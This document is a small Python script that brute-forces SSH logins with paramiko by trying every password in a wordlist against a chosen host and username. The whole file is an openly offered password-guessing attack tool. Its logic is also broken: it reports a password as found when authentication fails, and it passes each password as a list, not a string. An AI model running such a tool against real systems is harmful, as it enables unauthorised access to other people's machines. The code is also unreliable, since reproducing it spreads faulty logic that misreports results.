import paramiko,argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="URL of the target")
parser.add_argument('-u','--username',help="Username")
parser.add_argument('-w','--wordlist',help="wordlist")
parser.add_argument('-p','--port',help="port")
parser.add_argument('-d','--demo',help="diplay help")
args = parser.parse_args()

target = args.target
username = args.username
wordlist = args.wordlist
port = args.port


help = """
        -t , --target   URL of the target
        -u , --user     Username
        -w , --wordlist wordlist
        -p , --port     port
        -d , --demo     display help
        eg usage: python3 ssh_bruteforce.py -t www.target.com -u user -w /path/to/wordlist.txt -p port
    """


if not target or not username or not wordlist or not port:
    print("Please use the correct syntax\n")
    print(help)

def connect(password):
    result = 1
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=target,username=username,port=port,password=password)
    except paramiko.AuthenticationException:
        result = 0
    client.close()
    return result

with open(wordlist,'r') as word:
    for w in word.readlines():
        password = w.split()
        try:
            response = connect(password)
            if response ==0:
                print(f'The password is {password}')
            else:
                continue
        except Exception as e:
            print(e)
    
word.close()
            

